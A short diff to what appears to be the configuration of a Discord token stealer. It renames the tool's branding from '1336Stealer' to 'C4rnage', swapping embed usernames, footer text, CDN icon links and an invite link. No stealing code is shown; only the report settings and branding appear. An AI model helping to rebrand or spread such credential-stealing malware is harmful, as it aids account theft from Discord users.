@@ -25,13 +25,13 @@ var config = {
     ping: [false, "@everyone"],
 
     embed: {
-        username: "1336Stealer",
+        username: "C4rnage",
         footer: {
-            text: `@1336Stealer`,
-            icon_url: "https://media.discordapp.net/attachments/894698886621446164/895125411900559410/a_721d6729d0b5e1a8979ab7a445378e9a.gif",
+            text: `@C4rnage`,
+            icon_url: "https://cdn.discordapp.com/attachments/1071806019967131708/1071820523669033050/PngItem_5536960.png",
         },
-        href: "https://discord.gg/MtSkEA4aNg",
-        avatar_url: "https://media.discordapp.net/attachments/894698886621446164/895125411900559410/a_721d6729d0b5e1a8979ab7a445378e9a.gif"
+        href: "C4rnage",
+        avatar_url: "https://cdn.discordapp.com/attachments/1071806019967131708/1071820523669033050/PngItem_5536960.png"
     },
 
     badges: {
